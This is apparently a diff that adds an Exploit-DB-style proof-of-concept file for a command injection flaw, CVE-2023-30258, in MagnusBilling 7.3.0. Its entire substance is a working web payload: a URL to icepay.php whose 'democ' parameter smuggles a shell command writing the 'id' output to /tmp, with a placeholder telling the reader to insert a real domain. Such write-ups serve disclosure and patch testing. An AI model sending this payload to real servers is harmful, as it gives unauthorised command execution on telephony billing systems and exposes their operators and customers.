@@ -1,0 +1,17 @@
+# Exploit Title: MagnusSolution magnusbilling 7.3.0 - Command Injection
+# Date: 2024-10-26
+# Exploit Author: CodeSecLab
+# Vendor Homepage: https://github.com/magnussolution/magnusbilling7
+# Software Link: https://github.com/magnussolution/magnusbilling7
+# Version: 7.3.0
+# Tested on: Centos
+# CVE : CVE-2023-30258
+
+
+# PoC URL for Command Injection
+
+http://magnusbilling/lib/icepay/icepay.php?democ=testfile; id > /tmp/injected.txt
+
+Result: This PoC attempts to inject the id command.
+
+[Replace Your Domain Name]
